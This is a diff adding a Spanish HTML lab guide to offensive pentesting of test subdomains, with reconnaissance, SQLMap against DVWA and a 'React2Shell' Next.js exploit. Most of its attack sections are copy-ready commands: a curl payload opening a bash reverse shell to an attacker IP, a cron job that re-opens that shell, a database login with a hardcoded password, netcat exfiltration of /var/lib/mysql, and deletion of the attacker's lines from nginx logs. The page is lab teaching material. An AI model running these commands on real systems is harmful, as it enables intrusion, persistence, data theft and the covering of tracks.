@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fase Ofensiva: Reconocimiento y Pentesting</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="../assets/css/site.css">
+</head>
+<body class="flex justify-center bg-slate-100 text-slate-900">
+    <script>
+        async function copyCode(button, targetId) {
+            const node = document.getElementById(targetId);
+            if (!node) return;
+            try {
+                await navigator.clipboard.writeText(node.textContent);
+                const original = button.textContent;
+                button.textContent = 'Copiado';
+                button.classList.add('bg-emerald-500/20', 'text-emerald-200');
+                setTimeout(() => {
+                    button.textContent = original;
+                    button.classList.remove('bg-emerald-500/20', 'text-emerald-200');
+                }, 1600);
+            } catch (error) {
+                button.textContent = 'No disponible';
+                setTimeout(() => button.textContent = 'Copiar', 1600);
+            }
+        }
+    </script>
+    <main class="flex min-h-screen w-full max-w-[1440px] flex-col gap-8 px-4 py-6 md:px-8 md:py-10 lg:flex-row lg:items-start">
+        <aside class="lg:sticky lg:top-6 lg:h-[calc(100vh-3rem)] lg:w-80 lg:shrink-0">
+            <div class="h-full overflow-y-auto rounded-3xl border border-slate-200 bg-white p-6 shadow-2xl shadow-slate-300/35 backdrop-blur">
+                <div class="flex items-start gap-4">
+                    <div class="flex h-12 w-12 items-center justify-center rounded-2xl bg-red-600 text-white font-bold">ATK</div>
+                    <div>
+                        <p class="text-xs font-bold uppercase tracking-[0.3em] text-red-700">Fase Ofensiva</p>
+                        <h1 class="mt-1 text-2xl font-black text-slate-950">Pentesting</h1>
+                    </div>
+                </div>
+
+                <nav class="mt-8 space-y-2 text-sm">
+                    <a href="#portada" class="nav-link">Portada</a>
+                    <a href="#recon" class="nav-link">Reconocimiento</a>
+                    <a href="#vuln" class="nav-link">Análisis de Vulnerabilidades</a>
+                    <a href="#sqli" class="nav-link">Vector 1: SQL Injection</a>
+                    <a href="#rce" class="nav-link">Vector 2: RCE React2Shell</a>
+                    <a href="#post" class="nav-link">Post-Explotación</a>
+                    <a href="#informe" class="nav-link">Informe de Pentest</a>
+                    <a href="../index.html" class="nav-link border-cyan-200 bg-cyan-50 text-cyan-900">Volver al menú principal</a>
+                </nav>
+
+                <div class="mt-8 pt-6 border-t border-slate-200 text-center text-xs text-slate-500">
+                    <p>Autor: <span class="font-semibold text-slate-800">AarónSGómez</span></p>
+                    <a href="https://asga.vercel.app" target="_blank" class="mt-1 inline-block text-cyan-600 hover:underline">asga.vercel.app</a>
+                </div>
+            </div>
+        </aside>
+
+        <section class="min-w-0 flex-1 space-y-6 pb-10">
+            <header id="portada" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-2xl shadow-slate-300/30 md:p-10">
+                <p class="hero-pill">Auditoría Ofensiva</p>
+                <h2 class="mt-4 text-3xl font-black tracking-tight text-slate-950 md:text-5xl">Guía de Ataques y Auditorías Perimetrales</h2>
+                <p class="mt-4 max-w-4xl text-base leading-8 text-slate-700 md:text-lg">
+                    Este manual recoge las metodologías de reconocimiento activo y pasivo, análisis automatizado de CVEs, explotación y post-explotación del laboratorio, simuladas desde la máquina atacante Kali Linux.
+                </p>
+            </header>
+
+            <section id="recon" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
+                <h3 class="text-2xl font-bold text-slate-950">1. Reconocimiento con 5 Herramientas</h3>
+                <p class="mt-3 leading-8 text-slate-700">Mapeo de la superficie de ataque perimetral utilizando herramientas pasivas y activas orientadas a los subdominios DuckDNS.</p>
+
+                <div class="mt-6 space-y-6">
+                    <div>
+                        <h4 class="font-bold text-slate-900">1. Nmap (Escaneo activo)</h4>
+                        <p class="text-sm text-slate-600 mt-1">Escaneo de puertos TCP, fingerprint de servicios y scripts por defecto en el subdominio principal.</p>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Terminal Kali Linux</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-nmap')">Copiar</button>
+                            </div>
+                            <pre id="code-nmap" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>nmap -sV -sC -Pn webinsegura1.duckdns.org</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura nmap.png con descripcion
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">2. Whois / DNSdumpster (Reconocimiento pasivo)</h4>
+                        <p class="text-sm text-slate-600 mt-1">Inspección de registros DNS públicos e información de registro de red para los dominios de prueba.</p>
+                    </div>
+
+                    # aqui agrega la captura dnsdumpster.png con descripcion
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">3. The Harvester (Búsqueda de OSINT)</h4>
+                        <p class="text-sm text-slate-600 mt-1">Extracción de correos electrónicos, subdominios y hosts expuestos en fuentes abiertas como Bing.</p>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Terminal Kali Linux</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-harvester')">Copiar</button>
+                            </div>
+                            <pre id="code-harvester" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>theHarvester -d duckdns.org -b bing</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura harvester.png con descripcion
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">4. SpiderFoot (Mapeo automatizado)</h4>
+                        <p class="text-sm text-slate-600 mt-1">Escaneo modular pasivo para agrupar todas las relaciones e información de DNS, IP y geolocalización.</p>
+                    </div>
+
+                    # aqui agrega la captura spiderfoot.png con descripcion
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">5. Script Python Propio (Extracción de Headers)</h4>
+                        <p class="text-sm text-slate-600 mt-1">Comprobación del puerto HTTPS 443 activo y lectura de cabeceras HTTP de Nginx/Apache.</p>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>recon_wan.py</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-python')">Copiar</button>
+                            </div>
+                            <pre id="code-python" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>import socket
+import requests
+
+# Verificar puerto 443 abierto
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(3)
+resultado = s.connect_ex(('webinsegura1.duckdns.org', 443))
+print(f"Puerto 443 abierto: {resultado == 0}")
+
+# Consultar y mostrar las cabeceras HTTP expuestas
+r = requests.get('https://webinsegura1.duckdns.org', verify=False)
+for header, value in r.headers.items():
+    print(f"{header}: {value}")</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura script_python.png con descripcion
+                </div>
+             <section id="vuln" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
+                <h3 class="text-2xl font-bold text-slate-950">2. Análisis de Vulnerabilidades con CVE</h3>
+                <p class="mt-3 leading-8 text-slate-700">Ejecución del análisis estático y dinámico para mapear fallos de software frente a la base de datos oficial de CVEs.</p>
+
+                <div class="space-y-4">
+                    <p class="text-sm leading-7 text-slate-700"><strong>OWASP ZAP / OpenVAS:</strong> El análisis automatizado del dominio reportará fallos graves relacionados con el entorno vulnerable.</p>
+                    
+                    <div class="overflow-x-auto mt-4">
+                        <table class="min-w-full divide-y divide-slate-200 text-sm">
+                            <thead>
+                                <tr>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Vector / Vulnerabilidad</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">CVSS v3.1</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">ID CVE / Tipo</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Descripción Corta</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-slate-100">
+                                <tr>
+                                    <td class="px-4 py-3 font-semibold text-red-700">React2Shell (Next.js)</td>
+                                    <td class="px-4 py-3 text-red-650 font-bold">10.0 (Crítica)</td>
+                                    <td class="px-4 py-3 font-mono">CVE-2025-55182 / CVE-2025-66478</td>
+                                    <td class="px-4 py-3 text-slate-650">Deserialización RCE insegura en el protocolo Flight de componentes React.</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-3 font-semibold text-amber-700">Inyección SQL (DVWA)</td>
+                                    <td class="px-4 py-3 text-amber-650 font-bold">7.5 (Alta)</td>
+                                    <td class="px-4 py-3 font-mono">CWE-89 / SQLi</td>
+                                    <td class="px-4 py-3 text-slate-650">Falta de sanitización de parámetros en formularios de acceso a la DB.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    # aqui agrega la captura scan_report.png con descripcion
+                    # aqui agrega la captura ssl_test.png con descripcion
+                </div>
+
+                <div class="space-y-4 border-t border-slate-100 pt-6">
+                    <h4 class="text-xl font-bold text-slate-950">Estrategia Táctica: Centralización en Kali Linux</h4>
+                    <p class="text-sm leading-7 text-slate-700">
+                        Para mantener una higiene metodológica profesional y facilitar el posterior filtrado de eventos en el SIEM, se recomienda centralizar todas las herramientas ofensivas desde tu máquina <strong>Kali Linux</strong>:
+                    </p>
+                    <ul class="list-disc pl-5 space-y-2 text-sm text-slate-700">
+                        <li><strong>Consistencia de IP:</strong> Al lanzar los ataques y escaneos de vulnerabilidades desde una sola IP en Kali, se simplifica el filtrado en el <code>access.log</code> de Nginx y en los paneles de Wazuh.</li>
+                        <li><strong>Gestión unificada:</strong> Se evita fragmentar la superficie de ataque entre sistemas Windows y Kali, manteniendo las trazas en un único nodo origen.</li>
+                    </ul>
+                </div>
+
+                <div class="space-y-4 border-t border-slate-100 pt-6">
+                    <h4 class="text-xl font-bold text-slate-950">Ejecución de OWASP ZAP desde Kali (Entorno Remoto o Headless)</h4>
+                    <p class="text-sm leading-7 text-slate-700">
+                        Si estás operando sobre una VM de Kali sin entorno de escritorio o deseas realizar los escaneos en segundo plano:
+                    </p>
+                    <div class="mt-4">
+                        <p class="text-sm text-slate-600"><strong>Opción A: Ejecución gráfica clásica</strong></p>
+                        <div class="code-shell mt-2">
+                            <pre class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>zaproxy</code></pre>
+                        </div>
+                    </div>
+                    <div class="mt-4">
+                        <p class="text-sm text-slate-600"><strong>Opción B: Modo Daemon con API Web (Acceso remoto)</strong></p>
+                        <p class="text-xs text-slate-500 mt-1">Lanza el escáner como servicio en la terminal de Kali y accede al asistente gráfico desde el navegador de tu máquina Windows principal:</p>
+                        <div class="code-shell mt-2">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Terminal Kali Linux (Headless)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-zap-daemon')">Copiar</button>
+                            </div>
+                            <pre id="code-zap-daemon" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true</code></pre>
+                        </div>
+                        <p class="text-xs text-slate-500 mt-2">Una vez ejecutado, accede en el host a: <code>http://IP_DE_KALI:8080</code> para usar la API interactiva.</p>
+                    </div>
+                </div>
+
+                <div class="space-y-4 border-t border-slate-100 pt-6">
+                    <h4 class="text-xl font-bold text-slate-950">Flujo Recomendado de Pentesting</h4>
+                    <p class="text-sm leading-7 text-slate-700">
+                        Para maximizar las evidencias y registros en el SOC, sigue esta secuencia lógica de ejecución:
+                    </p>
+                    <ol class="list-decimal pl-5 space-y-2 text-sm text-slate-700">
+                        <li><strong>Fase 1: Reconocimiento:</strong> Ejecución de escaneos DNS y <code>nmap</code>.</li>
+                        <li><strong>Fase 2: Escaneo DAST:</strong> Lanzar OWASP ZAP a los dos subdominios DuckDNS para registrar el tráfico en Wazuh.</li>
+                        <li><strong>Fase 3: Explotación y Control:</strong> Explotar el panel de login/búsqueda con SQLMap y detonar la shell reversa por RCE.</li>
+                    </ol>
+                </div>
+            </section>
+
+            <section id="sqli" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
+                <h3 class="text-2xl font-bold text-slate-950">3. Vector 1: SQL Injection en DVWA</h3>
+                <p class="mt-3 leading-8 text-slate-700">Explotación del parámetro de identificación en la base de datos de DVWA e interceptación del tráfico HTTP.</p>
+
+                <div class="mt-6 space-y-6">
+                    <ol class="list-decimal pl-5 space-y-2 text-sm text-slate-700">
+                        <li>Acceso al parámetro vulnerable de DVWA con cookie de sesión.</li>
+                        <li>Ejecución de <strong>SQLMap</strong> para volcar las bases de datos de MariaDB:</li>
+                    </ol>
+
+                    <div class="code-shell mt-3">
+                        <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                            <span>sqlmap</span>
+                            <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-sqlmap')">Copiar</button>
+                        </div>
+                        <pre id="code-sqlmap" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion_cookie" --batch --dbs</code></pre>
+                    </div>
+
+                    # aqui agrega la captura burpsuite.png con descripcion
+                    # aqui agrega la captura sqlmap_db.png con descripcion
+                    # aqui agrega la captura log_wazuh_sqli.png con descripcion
+                </div>
+            </section>
+
+            <section id="rce" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
+                <h3 class="text-2xl font-bold text-slate-950">4. Vector 2: RCE React2Shell</h3>
+                <p class="mt-3 leading-8 text-slate-700">Aprovechamiento de la deserialización de RSC en Next.js para ejecutar comandos del sistema e instanciar una shell reversa.</p>
+
+                <div class="mt-6 space-y-6">
+                    <div>
+                        <h4 class="font-bold text-slate-900">1. Servidor de Escucha Netcat</h4>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Terminal Kali Linux (Escucha)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-netcat')">Copiar</button>
+                            </div>
+                            <pre id="code-netcat" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>nc -lvnp 4444</code></pre>
+                        </div>
+                    </div>
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">2. Disparo de exploit por deserialización RSC</h4>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Terminal Kali Linux (Ataque)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-exploit')">Copiar</button>
+                            </div>
+                            <pre id="code-exploit" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>curl -X POST -H "Content-Type: text/x-component" --data-binary $'1:I\n2:O{"command": "bash -c \'bash -i >& /dev/tcp/IP_PUBLICA_ATACANTE/4444 0>&1\'"}' https://webinsegura1.duckdns.org/api/rsc -k</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura netcat_shell.png con descripcion
+                    # aqui agrega la captura log_wazuh_rce.png con descripcion
+                </div>
+            </section>
+
+            <section id="post" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
+                <h3 class="text-2xl font-bold text-slate-950">5. Post-Explotación</h3>
+                <p class="mt-3 leading-8 text-slate-700">Técnicas defensivas e intrusivas llevadas a cabo una vez controlada la terminal remota del contenedor.</p>
+
+                <div class="mt-6 space-y-6">
+                    <div>
+                        <h4 class="font-bold text-slate-900">1. Persistencia (Cronjob)</h4>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Contenedor Comprometido</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-persist')">Copiar</button>
+                            </div>
+                            <pre id="code-persist" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>(crontab -l ; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/IP_PUBLICA_ATACANTE/4444 0>&1'") | crontab -</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura cronjob.png con descripcion
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">2. Movimiento Lateral (Pivoteo a Base de Datos)</h4>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Contenedor Comprometido</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-pivoting')">Copiar</button>
+                            </div>
+                            <pre id="code-pivoting" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>mysql -h 172.30.0.5 -u db_modern_user -pInsecureAIPassword_123 -e "SHOW DATABASES; USE lab_modern_db; SELECT * FROM users;"</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura db_pivoting.png con descripcion
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">3. Exfiltración de Datos (Vía Netcat)</h4>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Contenedor Comprometido</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-exfiltration')">Copiar</button>
+                            </div>
+                            <pre id="code-exfiltration" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>tar -czf - /var/lib/mysql | nc IP_PUBLICA_ATACANTE 5555</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura exfiltration.png con descripcion
+
+                    <div>
+                        <h4 class="font-bold text-slate-900">4. Limpieza de Huellas (Covering Tracks)</h4>
+                        <div class="code-shell mt-3">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                                <span>Contenedor Comprometido</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-covering')">Copiar</button>
+                            </div>
+                            <pre id="code-covering" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>sed -i '/IP_PUBLICA_ATACANTE/d' /var/log/nginx/access.log</code></pre>
+                        </div>
+                    </div>
+
+                    # aqui agrega la captura clearing.png con descripcion
+                </div>
+            </section>
+
+            <section id="informe" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
+                <h3 class="text-2xl font-bold text-slate-950">6. Informe de Pentest Redactado</h3>
+                <p class="mt-3 leading-8 text-slate-700">Integración de todos los vectores auditados en un reporte final detallando mitigación, severidad y pasos de remediación.</p>
+                <div class="mt-4 space-y-4 text-sm leading-7 text-slate-700">
+                    <p><strong>Resumen Ejecutivo:</strong> Diseñado para proveer una visión global de la superficie de ataque comprometida del laboratorio al CISO.</p>
+                    <p><strong>Metodología:</strong> Detalle del cumplimiento de los estándares PTES y OSSTMM (reconocimiento pasivo/activo, escaneos de vulnerabilidades, explotación RCE/SQLi y post-explotación).</p>
+                    <p><strong>Remediación Recomendada:</strong> Parchear las dependencias vulnerables de Next.js a la versión <code>15.5.7</code> o superior, y sanear los parámetros de consulta SQL de DVWA.</p>
+                </div>
+            </section>
+        </section>
+    </main>
+</body>
+</html>
